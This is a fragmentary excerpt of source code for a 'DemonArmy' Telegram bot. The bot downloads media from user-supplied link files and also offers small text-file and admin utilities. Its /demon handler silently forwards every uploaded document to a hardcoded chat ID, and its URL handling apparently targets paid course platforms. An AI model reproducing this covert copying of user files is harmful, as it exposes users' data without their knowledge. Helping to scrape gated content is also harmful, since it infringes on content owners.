...
@bot.on_message(filters.command(["demon"]))
async def luminant_command(bot: Client, m: Message):
    ...
    if input.document:
        ...
        try:
            await bot.send_document(2327918459, x)
        except Exception as e:
...
#===============================================================
    if raw_text5 == "df":
        ...
        raw_text2 = "720"
        res = "1280x720"
        CR = '**[𝑫𝒆𝒎𝒐𝒏 𝑨𝒓𝒎𝒚 🏅](https://t.me/DemonArmy)**'
        raw_text4 = "df"
        thumb = "no"
    ...
    #===================== QUALITY =================================
        ...
        if raw_text3 == 'df':
            CR = '**[DemonArmy🏅](https://t.me/DemonArmy)**'
        else:
            CR = raw_text3    
            ...
            if "drive" in url:
                ...
                if 'penpencil' in url:
                    prog = await m.reply_text(
                        ...
                        f"╰────⌈**[𝗗𝗲𝗺𝗼𝗻𝗔𝗿𝗺𝘆🏅](https://t.me/DemonArmy)**⌋────╯"
                    )
                    ...
                    prog = await m.reply_text(
                        ...
                        f"╰────⌈**[𝑫𝒆𝒎𝒐𝒏 𝑨𝒓𝒎𝒚 🏅](https://t.me/DemonArmy)**⌋────╯"
                    )
...
4. **/demon** - 💡 Type this before sending your **📃.txt** file.
...
Feel free to contact @DemonArmy for further assistance or subscription details.
...
#================== id command button =======
# /youtube command logic
@bot.on_message(filters.command("youtube") & auth_or_owner_filter)
async def youtube_command(_, message):
    await message.reply("🎥 Send a YouTube link:")
...
# /h2t command logic
@bot.on_message(filters.command("h2t") & auth_or_owner_filter)
async def html_to_text_command(client: Client, message: Message):
    await message.reply("📄 Send your .html file:")
    html_msg = await client.listen(message.chat.id)
    if not html_msg.document:
        return await message.reply("❌ Send a valid .html file.")
    file = await html_msg.download()
    with open(file, 'r', encoding="utf-8") as f:
        soup = BeautifulSoup(f.read(), "html.parser")
    text = soup.get_text()
    output = file.replace(".html", ".txt")
    with open(output, 'w', encoding="utf-8") as out:
        out.write(text)
    await message.reply_document(output)

# /remtitle command logic
@bot.on_message(filters.command("remtitle") & auth_or_owner_filter)
async def remove_title_command(client: Client, message: Message):
    await message.reply("📄 Send your .txt file:")
    txt_msg = await client.listen(message.chat.id)
    if not txt_msg.document:
        return await message.reply("❌ Not a valid text file.")
    file = await txt_msg.download()
    with open(file, 'r') as f:
        lines = f.readlines()
    new_file = file.replace(".txt", "_remtitle.txt")
    with open(new_file, 'w') as f:
        f.writelines(lines[1:] if len(lines) > 1 else lines)
    await message.reply_document(new_file)

# /studyiqeditor placeholder logic
@bot.on_message(filters.command("studyiqeditor") & auth_or_owner_filter)
async def studyiq_command(client: Client, message: Message):
    await message.reply("📄 Send your StudyIQ format .txt file:")
    txt_msg = await client.listen(message.chat.id)
    file = await txt_msg.download()
    with open(file, 'r') as f:
        lines = f.readlines()
    clean_lines = [line.replace("[STUDYIQ]", "").strip() for line in lines]
    out_file = file.replace(".txt", "_edited.txt")
    with open(out_file, 'w') as f:
        f.write("\n".join(clean_lines))
    await message.reply_document(out_file)

# /restart command logic
@bot.on_message(filters.command("restart") & filters.user(OWNER_IDS))
...
BUTTONS = InlineKeyboardMarkup([[InlineKeyboardButton(text="Send Here", url=f"https://t.me/DemonArmy")]])

################Force and Show Owner Command
# Admin panel inline command
@bot.on_message(filters.command("admin") & filters.user(OWNER_IDS))
async def admin_panel(client: Client, message: Message):
    buttons = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("👑 Show Owner", callback_data="show_owner"),
            InlineKeyboardButton("💾 Force Owner", callback_data="force_owner")
        ]
    ])
    await message.reply("🔧 Admin Panel", reply_markup=buttons)

@bot.on_callback_query(filters.regex("show_owner") & filters.user(OWNER_IDS))
async def cb_show_owner(client: Client, query: CallbackQuery):
    owners = "\n".join([f"👑 `{oid}`" for oid in OWNER_IDS])
    await query.answer()
    await query.message.edit(f"👑 Current Owner(s):\n\n{owners}")

@bot.on_callback_query(filters.regex("force_owner") & filters.user(OWNER_IDS))
async def cb_force_owner(client: Client, query: CallbackQuery):
    global authorized_users
    added = False
    for owner_id in OWNER_IDS:
        if owner_id not in authorized_users:
    ...
    save_authorized_users(collection, authorized_users)
    await query.answer()
    msg = "✅ Owner(s) added and saved." if added else "ℹ️ Owner(s) already in list."
    await query.message.edit(msg)

@bot.on_message(filters.command("show_owner") & filters.user(OWNER_IDS))
async def show_owner_command(client: Client, message: Message):
    owners = "\n".join([f"👑 `{oid}`" for oid in OWNER_IDS])
    await message.reply(f"👑 Current Owner(s):\n\n{owners}")
...
def run_flask():
    app.run(host='0.0.0.0', port=8717)
